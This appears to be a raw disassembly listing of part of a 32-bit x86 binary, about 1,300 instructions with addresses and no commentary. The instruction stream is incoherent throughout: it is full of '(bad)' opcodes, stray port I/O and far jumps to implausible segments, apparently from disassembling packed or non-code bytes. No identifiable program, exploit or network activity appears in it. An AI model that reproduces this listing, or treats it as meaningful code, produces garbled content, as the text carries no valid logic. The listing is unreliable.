  4183fd:	nop
  4183fe:	or     eax,0x46575cae
  418403:	mov    esi,0x29436229
  418408:	and    ah,BYTE PTR [eax-0x70]
  41840b:	popa   
  41840c:	jnp    0x418408
  41840e:	push   0x4b
  418410:	not    DWORD PTR [esi+0x29]
  418413:	stos   DWORD PTR es:[edi],eax
  418414:	xor    ebx,DWORD PTR [ecx-0x25c98026]
  41841a:	xchg   esi,eax
  41841b:	adc    BYTE PTR [edi-0x54],dl
  41841e:	aaa    
  41841f:	icebp  
  418420:	mov    edi,0x6d283287
  418425:	or     al,0x4f
  418427:	pop    eax
  418428:	cld    
  418429:	xor    DWORD PTR [ebx],ecx
  41842b:	xor    BYTE PTR [edx+eax*8],ah
  41842e:	in     al,0x6
  418430:	and    eax,0x7eb00a77
  418435:	push   edx
  418436:	fwait
  418437:	cdq    
  418438:	rcr    ch,cl
  41843a:	mov    ch,0x57
  41843c:	es pop ds
  41843e:	adc    BYTE PTR [ecx+0x36511de8],0x1d
  418445:	(bad)  
  418446:	xchg   esp,eax
  418447:	pop    edx
  418448:	inc    edx
  418449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844a:	mov    ebx,0x4f095029
  41844f:	push   edi
  418450:	jg     0x418464
  418452:	or     al,0xe3
  418454:	cmp    BYTE PTR [edx-0x49e8b288],0xc3
  41845b:	cwde   
  41845c:	jno    0x4184d4
  41845e:	pop    eax
  41845f:	mov    cl,0xde
  418461:	or     al,BYTE PTR [ebx+0x402c3dbe]
  418467:	fcomp  DWORD PTR [esi-0x530d59ba]
  41846d:	mov    esi,ebp
  41846f:	daa    
  418470:	pop    edx
  418471:	(bad)  
  418472:	clc    
  418473:	jecxz  0x418400
  418475:	lahf   
  418476:	ret    
  418477:	arpl   WORD PTR [edi-0xa5ba774],bp
  41847d:	jb     0x4184fb
  41847f:	fwait
  418480:	add    ecx,DWORD PTR [edx-0x1301d4d4]
  418486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418487:	loop   0x4184f1
  418489:	push   ebx
  41848a:	push   esp
  41848b:	mov    cl,0x4d
  41848d:	iret   
  41848e:	pushf  
  41848f:	jb     0x418443
  418491:	dec    edx
  418492:	cmp    eax,DWORD PTR [edi+0x717cfcf0]
  418498:	ficom  DWORD PTR [edi-0x3b1d418b]
  41849e:	in     eax,dx
  41849f:	icebp  
  4184a0:	(bad)  
  4184a1:	jge    0x418484
  4184a3:	and    DWORD PTR [ecx],ebx
  4184a5:	les    esp,FWORD PTR [ebx+0xb]
  4184a8:	addr16 stc 
  4184aa:	and    BYTE PTR [edi+0xafcbf04],0x81
  4184b1:	(bad)  
  4184b2:	loop   0x4184cc
  4184b4:	fldcw  WORD PTR [ebp+0x4e92d40]
  4184ba:	sub    BYTE PTR ds:0xed98c9d0,dh
  4184c0:	or     al,0xcc
  4184c2:	pop    ebp
  4184c3:	daa    
  4184c4:	test   esp,esi
  4184c6:	add    ecx,ecx
  4184c8:	(bad)  
  4184c9:	jmp    0x13ebdbf8
  4184ce:	rcr    ah,1
  4184d0:	pop    es
  4184d1:	sti    
  4184d2:	popf   
  4184d3:	lods   eax,DWORD PTR ds:[esi]
  4184d4:	inc    esp
  4184d5:	arpl   WORD PTR [ebp+0x6a],dx
  4184d8:	push   ebx
  4184d9:	sbb    BYTE PTR [ecx],bh
  4184db:	mov    BYTE PTR [edi],0x9d
  4184de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184df:	pop    esi
  4184e0:	fimul  DWORD PTR [edi]
  4184e2:	bound  edi,QWORD PTR [edi-0x5d]
  4184e5:	mov    eax,ds:0x19ad447f
  4184ea:	xor    DWORD PTR [esi],0x48
  4184ed:	out    0xc4,eax
  4184ef:	mov    esp,0x609f8b40
  4184f4:	out    0xc8,eax
  4184f6:	mov    esp,0xf8fcbd41
  4184fb:	jmp    0x418572
  4184fd:	xchg   DWORD PTR ds:0xd90488e6,ecx
  418503:	cwde   
  418504:	sahf   
  418505:	fisubr DWORD PTR [edx+0x49]
  418508:	popa   
  418509:	nop
  41850a:	sbb    DWORD PTR [esi],ebp
  41850c:	push   ds
  41850d:	je     0x41854a
  41850f:	(bad)  
  418510:	xchg   esi,eax
  418511:	push   0x96c7375a
  418516:	inc    eax
  418517:	retf   
  418518:	(bad)  
  418519:	or     BYTE PTR [eax+edx*2],ch
  41851c:	gs cmc 
  41851e:	pusha  
  41851f:	push   0xd5d2e785
  418524:	(bad)  
  418525:	aam    0xe2
  418527:	pusha  
  418528:	int    0x3c
  41852a:	(bad)  
  41852c:	sahf   
  41852d:	xchg   edx,eax
  41852e:	or     DWORD PTR [edx],esp
  418530:	jle    0x418562
  418532:	jecxz  0x4185af
  418534:	mov    al,ds:0x3be09723
  418539:	xchg   esi,eax
  41853a:	lds    ebp,FWORD PTR [eax]
  41853c:	mov    ah,0x17
  41853e:	pop    edi
  41853f:	(bad)  
  418540:	mov    WORD PTR [ecx+edi*8-0x47bfb84d],ds
  418547:	stc    
  418548:	xor    DWORD PTR [ebp+0x2baf7ea8],0xe9fff3f5
  418552:	sub    esi,DWORD PTR [ecx-0x26]
  418555:	pop    esp
  418556:	dec    esp
  418557:	arpl   WORD PTR [edi-0x52ddb677],si
  41855d:	lahf   
  41855e:	xor    BYTE PTR [ecx+0x2ff6ac31],al
  418564:	mov    eax,ds:0xab080f31
  418569:	mov    cl,0x1c
  41856b:	cmp    al,0x2a
  41856d:	sub    eax,edi
  41856f:	pop    ebp
  418570:	inc    ebp
  418571:	mov    eax,0xbf20848b
  418576:	frstor [esi+eiz*2-0x54]
  41857a:	repnz hlt 
  41857c:	mov    al,0x3
  41857e:	lock aaa 
  418580:	mov    ebx,0x8ecf1ba6
  418585:	out    dx,al
  418586:	psubusb mm1,QWORD PTR [ebp-0x58]
  41858a:	or     ah,dl
  41858c:	ins    BYTE PTR es:[edi],dx
  41858d:	jp     0x418586
  41858f:	jnp    0x41852e
  418591:	lea    eax,[esi-0x7]
  418594:	stc    
  418595:	pop    ebx
  418596:	fwait
  418597:	mov    bh,0x98
  418599:	jnp    0x4185cb
  41859b:	and    bh,BYTE PTR [edi]
  41859d:	test   BYTE PTR [edi+ebp*1+0x4c858a53],dl
  4185a4:	aas    
  4185a5:	gs and al,0x81
  4185a8:	dec    ebx
  4185a9:	push   ebp
  4185aa:	dec    eax
  4185ab:	inc    ebx
  4185ac:	jne    0x418559
  4185ae:	fwait
  4185af:	lock jb 0x418618
  4185b2:	and    dl,BYTE PTR [esi+0x63]
  4185b5:	cld    
  4185b6:	out    0x4c,al
  4185b8:	add    eax,0x7530497b
  4185bd:	fwait
  4185be:	shl    dh,0xc5
  4185c1:	gs mov al,0xb8
  4185c5:	retf   
  4185c6:	dec    edx
  4185c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c8:	xor    edx,esp
  4185ca:	add    BYTE PTR [edi+0x717429a],bh
  4185d0:	lea    esi,[edx+ebp*4+0x65c39818]
  4185d7:	add    al,0x55
  4185d9:	test   cl,bh
  4185db:	sar    DWORD PTR [esi-0x337f71a3],cl
  4185e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185e2:	jb     0x41860d
  4185e4:	mov    esp,0x523abc20
  4185e9:	addr16 nop
  4185eb:	mov    ebx,0xa8039fc9
  4185f0:	dec    ecx
  4185f1:	mov    ch,0x5a
  4185f3:	test   al,0x68
  4185f5:	stos   DWORD PTR es:[edi],eax
  4185f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f7:	cld    
  4185f8:	dec    ecx
  4185f9:	jmp    0x4760:0x4953bab7
  418600:	jb     0x41864e
  418602:	mov    bh,0xef
  418604:	and    DWORD PTR [edx],0x636d2a9a
  41860a:	pop    ds
  41860b:	jmp    0x523d0c9f
  418610:	xor    eax,0x16dc1f1e
  418615:	push   es
  418616:	xchg   edi,eax
  418617:	dec    ebx
  418618:	pop    ebp
  418619:	retf   0x6857
  41861c:	ud2    
  41861e:	cdq    
  41861f:	outs   dx,BYTE PTR ds:[esi]
  418620:	sbb    BYTE PTR gs:[edi-0x2a],dl
  418624:	mov    edi,0x7687d705
  418629:	add    BYTE PTR [ebp-0x3adf2210],dl
  41862f:	les    ebp,FWORD PTR [edi-0x51]
  418632:	test   DWORD PTR [esi+0x2d],esi
  418635:	les    ebp,FWORD PTR [edi+0x6a]
  418638:	outs   dx,BYTE PTR ds:[esi]
  418639:	or     esp,DWORD PTR [edx]
  41863b:	cmp    eax,0xec65c01
  418640:	or     DWORD PTR [ebp+edx*2+0x35],eax
  418644:	js     0x41866f
  418646:	test   BYTE PTR [ebp+0x43ffdc73],ah
  41864c:	arpl   WORD PTR [ebp+edx*4-0x74ea4793],cx
  418653:	aam    0xa7
  418655:	push   ecx
  418656:	std    
  418657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418658:	cmp    cx,WORD PTR [eax]
  41865b:	out    0x31,eax
  41865d:	icebp  
  41865e:	and    eax,DWORD PTR [ecx]
  418660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418661:	add    dh,BYTE PTR [ebx]
  418663:	shr    bl,1
  418665:	add    eax,0x72560936
  41866a:	out    0xdd,al
  41866c:	fist   WORD PTR [edx+0x7]
  41866f:	repz jae 0x4186b4
  418672:	sahf   
  418673:	cmp    ebx,DWORD PTR [eax]
  418675:	ret    
  418676:	add    edi,DWORD PTR [edx-0x1b116bc2]
  41867c:	stos   BYTE PTR es:[edi],al
  41867d:	pop    edx
  41867e:	imul   BYTE PTR [esi+0x42]
  418681:	cmp    ah,BYTE PTR [edx+0x5d2af54c]
  418687:	repnz push esi
  418689:	ja     0x418620
  41868b:	xor    DWORD PTR [esi+0x70b660d5],0x9a86ab0a
  418695:	sbb    BYTE PTR [ecx+eax*8+0x21a69d50],ch
  41869c:	sub    edx,DWORD PTR [eax]
  41869e:	(bad)  
  41869f:	lahf   
  4186a0:	add    bl,BYTE PTR [esi]
  4186a2:	cs mov bl,0x34
  4186a5:	push   eax
  4186a6:	add    eax,0xa5ec20a7
  4186ab:	xor    DWORD PTR [esi],eax
  4186ad:	jmp    0x418635
  4186af:	fidivr DWORD PTR [esp+eiz*2-0x54]
  4186b3:	mov    bh,0x0
  4186b5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186b7:	aas    
  4186b8:	fcomp  st(7)
  4186ba:	leave  
  4186bb:	fldcw  WORD PTR [edi+ecx*4]
  4186be:	cmp    BYTE PTR [edi-0x17],dh
  4186c1:	and    bh,0xbf
  4186c4:	sub    eax,0x1c0983be
  4186c9:	ins    DWORD PTR es:[edi],dx
  4186ca:	push   esi
  4186cb:	adc    dh,BYTE PTR [edi+eax*1+0x65cbf34f]
  4186d2:	mov    eax,ds:0xea3af57e
  4186d7:	retf   0x57d8
  4186da:	ret    
  4186db:	mov    ch,0x7
  4186dd:	out    dx,eax
  4186de:	add    eax,0x7c660d3e
  4186e3:	xchg   BYTE PTR [edx+0x3e1a0108],ah
  4186e9:	retf   0xf091
  4186ec:	(bad)  
  4186ed:	and    ecx,DWORD PTR [esi+0x5f756a78]
  4186f3:	sbb    ah,BYTE PTR [ecx]
  4186f5:	stc    
  4186f6:	xor    BYTE PTR [edi+0x3e],bl
  4186f9:	repz dec ecx
  4186fb:	xchg   ebx,eax
  4186fc:	enter  0x106d,0x94
  418700:	jne    0x418710
  418702:	cmc    
  418703:	xor    ch,BYTE PTR ds:0xb973c1c
  418709:	xor    eax,0x359a25a6
  41870e:	push   ss
  41870f:	mov    ecx,0xebd70cf7
  418714:	scas   al,BYTE PTR es:[edi]
  418715:	push   cs
  418716:	dec    ebp
  418717:	jo     0x4186af
  418719:	or     ecx,DWORD PTR [edx-0x25217ed0]
  41871f:	dec    edx
  418720:	push   esp
  418721:	int3   
  418722:	dec    eax
  418723:	shl    BYTE PTR [edi],1
  418725:	out    0x81,al
  418727:	int3   
  418728:	sub    eax,0xd47a6f50
  41872d:	sbb    esp,DWORD PTR [ecx+0x16]
  418730:	dec    edi
  418731:	nop
  418732:	dec    esp
  418733:	dec    ebp
  418734:	cwde   
  418735:	sar    DWORD PTR [esi],0x86
  418738:	and    ebp,esi
  41873a:	aad    0xf6
  41873c:	adc    BYTE PTR [eax-0x39],al
  41873f:	jo     0x41874f
  418741:	push   eax
  418742:	add    al,0xa2
  418744:	inc    edi
  418745:	push   es
  418746:	mov    al,0x1c
  418748:	pop    ds
  418749:	cs pop esi
  41874b:	or     eax,0xa72797fd
  418750:	adc    DWORD PTR [edi+esi*8+0x61e7dc8f],esp
  418757:	fild   DWORD PTR ds:0x786124ce
  41875d:	sub    bl,BYTE PTR [ebx-0x2ff12a31]
  418763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418764:	stc    
  418765:	int3   
  418766:	push   0x5c6517da
  41876b:	mov    ds:0x8a776977,eax
  418770:	pop    esp
  418771:	pop    ecx
  418772:	inc    esi
  418773:	mov    bh,bh
  418775:	into   
  418776:	inc    ebp
  418777:	mov    eax,0x5543f4ed
  41877c:	cmp    bh,0xc1
  41877f:	xor    al,0xe9
  418781:	pop    eax
  418782:	sbb    BYTE PTR [edx+eiz*4+0x60274868],dl
  418789:	into   
  41878a:	jbe    0x418776
  41878c:	mov    bh,0xb6
  41878e:	mov    gs,edi
  418790:	fcom   QWORD PTR [eax-0x53]
  418793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418794:	mov    cl,0x68
  418796:	outs   dx,DWORD PTR ds:[esi]
  418797:	dec    ebp
  418798:	fcom   DWORD PTR [esi]
  41879a:	pop    esi
  41879b:	mov    dh,0x84
  41879d:	imul   eax,DWORD PTR [ebx],0x2b86448d
  4187a3:	jg     0x418770
  4187a5:	sub    ah,cl
  4187a7:	out    dx,eax
  4187a8:	(bad)  
  4187a9:	xlat   BYTE PTR ds:[ebx]
  4187aa:	pop    ss
  4187ab:	dec    ecx
  4187ac:	xchg   esi,eax
  4187ad:	imul   DWORD PTR [edi-0x363a97b3]
  4187b3:	jns    0x41879f
  4187b5:	fs push eax
  4187b7:	fwait
  4187b8:	in     eax,0xcb
  4187ba:	int3   
  4187bb:	sti    
  4187bc:	dec    eax
  4187bd:	(bad)  
  4187be:	call   0x41d780bf
  4187c3:	push   esp
  4187c4:	push   ebx
  4187c5:	int3   
  4187c6:	add    edx,DWORD PTR [edi+ecx*1+0x33]
  4187ca:	retf   
  4187cb:	jp     0x4187ad
  4187cd:	sub    eax,0x3e8e7a0b
  4187d2:	and    bl,BYTE PTR [edx+0x39]
  4187d5:	pusha  
  4187d6:	sbb    BYTE PTR [edx+0x70],ah
  4187d9:	or     ebp,DWORD PTR [edx]
  4187db:	daa    
  4187dc:	addr16 xor cl,bl
  4187df:	mov    ah,0xde
  4187e1:	addr16 dec eax
  4187e3:	(bad)  
  4187e5:	push   0xad0f39d1
  4187ea:	in     eax,0x7f
  4187ec:	neg    DWORD PTR [ebx]
  4187ee:	sbb    al,0x3b
  4187f0:	xor    dl,al
  4187f2:	and    ebp,DWORD PTR [edi-0x7cc3790]
  4187f8:	mov    gs,WORD PTR [ecx-0x1c]
  4187fb:	jae    0x4187c2
  4187fd:	repz pop ss
  4187ff:	repnz adc esp,esi
  418802:	inc    eax
  418803:	push   0xf54966cb
  418808:	mov    esp,0x6c80397f
  41880d:	out    dx,al
  41880e:	add    BYTE PTR [ecx+0x5a874718],dl
  418814:	jnp    0x4187d3
  418816:	sahf   
  418817:	ret    0x6a05
  41881a:	stos   DWORD PTR es:[edi],eax
  41881b:	sbb    edi,DWORD PTR [ebp-0x60]
  41881e:	push   esi
  41881f:	mov    dh,0xfb
  418821:	push   0xffffff83
  418823:	repz mov ds:0xc9aced40,al
  418829:	(bad)  
  41882b:	jecxz  0x418877
  41882d:	jp     0x41880d
  41882f:	int3   
  418830:	sub    eax,0x3a0c9b92
  418835:	bound  eax,QWORD PTR [ebx-0x2ea6aeeb]
  41883b:	and    BYTE PTR [esi],dl
  41883d:	mov    ecx,0xb812a0b6
  418842:	popf   
  418843:	and    BYTE PTR [ebx],dh
  418845:	in     eax,dx
  418846:	neg    DWORD PTR [edi+esi*2]
  418849:	mov    eax,ds:0x1ca73551
  41884e:	cmp    ebp,edi
  418850:	mov    ds,WORD PTR [ebp-0x59]
  418853:	test   DWORD PTR ds:0x5fa41e67,edx
  418859:	or     eax,0x12254438
  41885e:	in     eax,0xcc
  418860:	std    
  418861:	xor    bh,BYTE PTR [ecx-0x28]
  418864:	hlt    
  418865:	inc    eax
  418866:	stos   DWORD PTR es:[edi],eax
  418867:	mov    ds:0x6ba08aef,al
  41886c:	shl    DWORD PTR [ebx-0x6af01800],cl
  418872:	loop   0x418808
  418874:	sbb    BYTE PTR [ebx],ch
  418876:	pop    ebx
  418877:	aam    0x21
  418879:	(bad)  
  41887a:	xchg   edx,eax
  41887b:	aas    
  41887c:	dec    edi
  41887d:	mov    esp,0xf38338e
  418882:	push   DWORD PTR [edi]
  418884:	leave  
  418885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418886:	jecxz  0x4188b6
  418888:	push   ds
  418889:	xor    al,0xad
  41888b:	test   DWORD PTR [ebx-0x6af96697],edi
  418891:	pop    edi
  418892:	je     0x418867
  418894:	leave  
  418895:	mov    ecx,0x3fe8deff
  41889a:	push   ecx
  41889b:	clc    
  41889c:	out    0x34,al
  41889e:	mov    esp,0x780e94e7
  4188a3:	xchg   esi,eax
  4188a4:	sub    eax,0xb9c99696
  4188a9:	das    
  4188aa:	pop    ebp
  4188ab:	in     eax,0x47
  4188ad:	fsubr  st,st(4)
  4188af:	dec    ebx
  4188b0:	push   0x6a
  4188b2:	fwait
  4188b3:	clc    
  4188b4:	outs   dx,BYTE PTR ds:[esi]
  4188b5:	hlt    
  4188b6:	sbb    eax,0x5b27007
  4188bb:	and    al,0xc6
  4188bd:	call   FWORD PTR [ebx+0x7d29849a]
  4188c3:	inc    esi
  4188c4:	imul   eax,DWORD PTR [eax-0x5eab6ea3],0xc9bb2a79
  4188ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188cf:	ss or  eax,0x99008441
  4188d5:	sbb    ch,dl
  4188d7:	adc    al,0x56
  4188d9:	scas   al,BYTE PTR es:[edi]
  4188da:	add    al,0x86
  4188dc:	xchg   ebx,eax
  4188dd:	(bad)  
  4188de:	xor    eax,0xbc9b5483
  4188e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e4:	jle    0x418935
  4188e6:	pop    esi
  4188e7:	outs   dx,BYTE PTR ds:[esi]
  4188e8:	jmp    0x5757:0x97ab492b
  4188ef:	or     ecx,DWORD PTR [ebx-0x51d1538b]
  4188f5:	mov    ebx,0x1faaa107
  4188fa:	pop    ds
  4188fb:	enter  0x5732,0x98
  4188ff:	sbb    ecx,ebx
  418901:	xor    cl,BYTE PTR ds:0x95a10ea8
  418907:	fsubr  QWORD PTR [ecx]
  418909:	(bad)  
  41890a:	int3   
  41890b:	fdivr  DWORD PTR [eax]
  41890d:	add    al,BYTE PTR [esi-0x2001c2b6]
  418913:	pop    eax
  418915:	cwde   
  418916:	lock dec esp
  418918:	out    dx,eax
  418919:	aam    0xfa
  41891b:	sub    DWORD PTR [edx+ebx*1-0x77370a3],0xffffff83
  418923:	jbe    0x41891d
  418925:	loopne 0x4188f2
  418927:	xchg   ebx,eax
  418928:	adc    dh,BYTE PTR [esp+ecx*1+0x38]
  41892c:	mov    ds:0x7b004499,al
  418931:	inc    ebp
  418932:	inc    esi
  418933:	out    dx,al
  418934:	xchg   ebp,eax
  418935:	jbe    0x418966
  418937:	dec    eax
  418938:	in     al,0xbc
  41893a:	arpl   WORD PTR ss:[eax+ebx*1-0x58],di
  41893f:	and    al,0x28
  418941:	sub    esp,edi
  418943:	adc    dh,0x22
  418946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418947:	xor    DWORD PTR [eax-0x17],eax
  41894a:	lods   eax,DWORD PTR ds:[esi]
  41894b:	out    0xad,eax
  41894d:	jge    0x4189c4
  41894f:	adc    eax,0x6b1f3fc8
  418954:	jae    0x418962
  418956:	adc    BYTE PTR [esi-0x7e],al
  418959:	jle    0x4188ff
  41895b:	mov    edx,0x81851950
  418960:	sbb    DWORD PTR [ebp+esi*2+0x9db14a7],ebx
  418967:	push   cs
  418968:	sar    BYTE PTR [ecx],1
  41896a:	fcomp  DWORD PTR [esi]
  41896c:	push   ss
  41896d:	sbb    BYTE PTR [esi-0x6d9ce299],cl
  418973:	push   eax
  418974:	add    BYTE PTR [ecx+0x3666e229],dl
  41897a:	sub    dh,cl
  41897c:	cdq    
  41897d:	rol    edi,1
  41897f:	push   cs
  418980:	lds    esi,FWORD PTR [edx]
  418982:	not    BYTE PTR [ebx-0x21]
  418985:	sbb    DWORD PTR [edi-0x7cb8d5fb],esp
  41898b:	add    al,0x5
  41898d:	cwde   
  41898e:	mov    cx,0xd1d6
  418992:	ss sti 
  418994:	popa   
  418995:	xchg   BYTE PTR [eax],ah
  418997:	push   ebx
  418998:	pushf  
  418999:	mov    dh,bh
  41899b:	adc    BYTE PTR [eax],ah
  41899d:	inc    edi
  41899e:	shl    BYTE PTR [ebx-0x34],0x12
  4189a2:	out    dx,al
  4189a3:	mov    DWORD PTR [edx-0x6a],ebx
  4189a6:	lods   al,BYTE PTR ds:[esi]
  4189a7:	shr    BYTE PTR [edi-0x54eb33e],0xd4
  4189ae:	dec    edi
  4189af:	imul   esp,ebp,0xb45bd476
  4189b5:	jae    0x418982
  4189b7:	inc    esp
  4189b8:	and    DWORD PTR [eax],ecx
  4189ba:	(bad)
  4189bd:	(bad)  
  4189be:	xchg   ecx,eax
  4189bf:	or     al,0xb3
  4189c1:	mov    dh,0x12
  4189c3:	xchg   edi,eax
  4189c4:	scas   eax,DWORD PTR es:[edi]
  4189c5:	sub    BYTE PTR [eax+0x2d67bde9],bl
  4189cb:	in     eax,dx
  4189cc:	jmp    0x4189ec
  4189ce:	dec    esi
  4189cf:	sbb    eax,0x3861782a
  4189d4:	lahf   
  4189d5:	icebp  
  4189d6:	add    esi,DWORD PTR [ebx]
  4189d8:	push   ebp
  4189d9:	ret    0x9c32
  4189dc:	xchg   edi,eax
  4189dd:	dec    esp
  4189de:	jl     0x4189e2
  4189e0:	jecxz  0x4189b3
  4189e2:	mov    dl,0xf0
  4189e4:	out    dx,al
  4189e5:	cmp    BYTE PTR [edx],dh
  4189e7:	push   0x4306187c
  4189ec:	adc    BYTE PTR [eax+esi*2-0x1f086893],ch
  4189f3:	bound  ebp,QWORD PTR ss:[eax]
  4189f6:	loop   0x418978
  4189f8:	sub    al,0x67
  4189fa:	xchg   DWORD PTR [edx+0x6],ebx
  4189fd:	jecxz  0x418a7d
  4189ff:	icebp  
  418a00:	cmp    bl,bl
  418a02:	push   ss
  418a03:	mov    eax,0x35b6dd5d
  418a08:	cld    
  418a09:	xchg   ebx,eax
  418a0a:	rcl    DWORD PTR [esi],cl
  418a0c:	mov    bh,dl
  418a0e:	mov    al,0x5f
  418a10:	and    al,0xae
  418a12:	mov    eax,ebx
  418a14:	push   esp
  418a15:	shl    DWORD PTR [ebp+0x39],0x9f
  418a19:	mov    esp,0xfc81b9a0
  418a1e:	repnz dec edi
  418a20:	fscale 
  418a22:	pop    ebp
  418a23:	jbe    0x4189df
  418a25:	dec    esi
  418a26:	cdq    
  418a27:	hlt    
  418a28:	int3   
  418a29:	(bad)  
  418a2a:	cli    
  418a2b:	mov    esp,0x5b1378e7
  418a30:	xor    BYTE PTR ds:0x1aefcaa4,0x87
  418a37:	add    BYTE PTR [ebx],0xfb
  418a3a:	dec    ebx
  418a3b:	xchg   DWORD PTR ds:[eax],esp
  418a3e:	add    edx,0x3e
  418a41:	(bad)  
  418a43:	aas    
  418a44:	push   ecx
  418a45:	repnz (bad) 
  418a47:	pop    ds
  418a48:	outs   dx,DWORD PTR ds:[esi]
  418a49:	les    ecx,FWORD PTR [eax+0x2c]
  418a4c:	es repnz and al,0x93
  418a50:	(bad)  
  418a52:	das    
  418a53:	add    bl,BYTE PTR [edi]
  418a55:	cmp    BYTE PTR [ecx],dh
  418a57:	push   edx
  418a58:	sbb    esp,eax
  418a5a:	clc    
  418a5b:	popf   
  418a5c:	(bad)  
  418a5d:	nop
  418a5e:	cmp    DWORD PTR [esi+0x3352029],esp
  418a64:	stos   BYTE PTR es:[edi],al
  418a65:	push   eax
  418a66:	mov    al,ds:0x5067bccf
  418a6b:	(bad)  
  418a6c:	xor    dh,BYTE PTR [ecx+ebp*1-0x39]
  418a70:	mov    ebx,0xc3b59d59
  418a75:	fwait
  418a76:	outs   dx,DWORD PTR ds:[esi]
  418a77:	mov    ah,0xe7
  418a79:	call   0x5280398a
  418a7e:	jp     0x418a22
  418a80:	pop    ecx
  418a81:	adc    BYTE PTR ds:0x6495a43f,0x48
  418a88:	jp     0x418a9e
  418a8a:	xchg   edi,eax
  418a8b:	jns    0x418b02
  418a8d:	leave  
  418a8e:	xchg   BYTE PTR [eax+0x42],bl
  418a91:	jp     0x418afd
  418a93:	push   ss
  418a94:	repz ret 0xff5a
  418a98:	xor    al,0xbf
  418a9a:	js     0x418ad5
  418a9c:	iret   
  418a9d:	push   esi
  418a9e:	inc    edx
  418a9f:	out    dx,eax
  418aa0:	jmp    0x62f9:0xea6ad35
  418aa7:	dec    esp
  418aa8:	int    0x37
  418aaa:	mov    ah,0x9
  418aac:	mov    ch,0x15
  418aae:	push   ds
  418aaf:	jmp    0x69fd:0x5416d0eb
  418ab6:	sbb    al,0x62
  418ab8:	or     eax,DWORD PTR ds:0x90cf4499
  418abe:	out    0x52,eax
  418ac0:	fst    QWORD PTR gs:[ecx+0x391509d3]
  418ac7:	mov    eax,ds:0xee5aad6e
  418acc:	xchg   esi,eax
  418acd:	push   ebx
  418ace:	pop    edx
  418acf:	in     eax,dx
  418ad0:	cwde   
  418ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad2:	arpl   WORD PTR ds:0xca9cab52,cx
  418ad8:	mov    bl,0xaf
  418ada:	dec    ebp
  418adb:	pop    esi
  418adc:	sub    DWORD PTR es:[edx],ebp
  418adf:	ja     0x418aae
  418ae1:	mov    bh,BYTE PTR [edi]
  418ae3:	fldcw  WORD PTR [ebp-0x3ecb520]
  418ae9:	xchg   edx,eax
  418aea:	ret    
  418aeb:	mov    eax,0xd9d0038c
  418af0:	in     al,0xbd
  418af2:	out    dx,al
  418af3:	in     eax,0x59
  418af5:	add    ebx,ebp
  418af7:	test   al,0x79
  418af9:	cmp    esi,DWORD PTR [eax]
  418afb:	mov    DWORD PTR [ebx+0x33],ebx
  418afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aff:	push   edx
  418b00:	js     0x418b80
  418b02:	inc    edx
  418b03:	add    al,0x4b
  418b05:	cli    
  418b06:	sahf   
  418b07:	into   
  418b08:	aad    0x3e
  418b0a:	sub    ebp,DWORD PTR [edi-0x93610d1]
  418b10:	mov    DWORD PTR [edx],esi
  418b12:	stc    
  418b13:	cdq    
  418b14:	mov    dl,0x3d
  418b16:	in     eax,0xbf
  418b18:	test   BYTE PTR [esi-0x65],ch
  418b1b:	sub    ah,BYTE PTR [ebx+esi*8]
  418b1e:	sub    eax,0x597c7db
  418b23:	imul   edx,ecx,0xffffffd7
  418b26:	mov    ebx,0x68c91d0a
  418b2b:	xor    al,0x8
  418b2d:	inc    esp
  418b2e:	xor    esp,DWORD PTR [ecx+0x772d3ab6]
  418b34:	jne    0x418b25
  418b36:	out    0x87,eax
  418b38:	or     BYTE PTR [esi],cl
  418b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b3b:	mov    cl,0x5f
  418b3d:	adc    bh,BYTE PTR [eax+0x53]
  418b40:	aad    0x76
  418b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b43:	dec    edi
  418b44:	xor    cl,BYTE PTR [ecx+ebx*2]
  418b47:	es push cs
  418b49:	in     al,0x23
  418b4b:	pop    es
  418b4c:	outs   dx,DWORD PTR ds:[esi]
  418b4d:	stos   BYTE PTR es:[edi],al
  418b4e:	das    
  418b4f:	jp     0x418b08
  418b51:	imul   ecx,DWORD PTR [ecx+ebx*4-0x583d5b0b],0xf6729059
  418b5c:	mov    eax,0x777ca2f0
  418b61:	mov    BYTE PTR ds:0xf3f9745b,bh
  418b67:	mov    edi,0x3a3dded0
  418b6c:	out    dx,al
  418b6d:	mov    ebp,0xa0c31d0a
  418b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b73:	cs fucomip st,st(2)
  418b76:	add    DWORD PTR [edx-0x3ff392c3],edi
  418b7c:	cmc    
  418b7d:	mov    al,ds:0x7ca03619
  418b82:	rcr    dl,1
  418b84:	(bad)  
  418b85:	jb     0x418bba
  418b87:	imul   ebx,DWORD PTR [edx-0x51],0xffffff97
  418b8b:	aam    0xf
  418b8d:	sub    cl,BYTE PTR [ebx-0x2b0ae157]
  418b93:	stos   BYTE PTR es:[edi],al
  418b94:	pushf  
  418b95:	mov    cl,0xd1
  418b97:	stc    
  418b98:	xchg   BYTE PTR ds:0x96a6fa2,ch
  418b9e:	lock or DWORD PTR [eax+0x56],eax
  418ba2:	pop    ds
  418ba3:	ja     0x418b76
  418ba5:	sbb    ah,BYTE PTR [edi]
  418ba7:	inc    edi
  418ba8:	daa    
  418ba9:	jmp    0x418b7e
  418bab:	dec    esp
  418bac:	cmp    al,0xb5
  418bae:	repnz xlat BYTE PTR ds:[ebx]
  418bb0:	xor    dl,ah
  418bb2:	mov    esi,0xc11121af
  418bb7:	cmp    al,0xbc
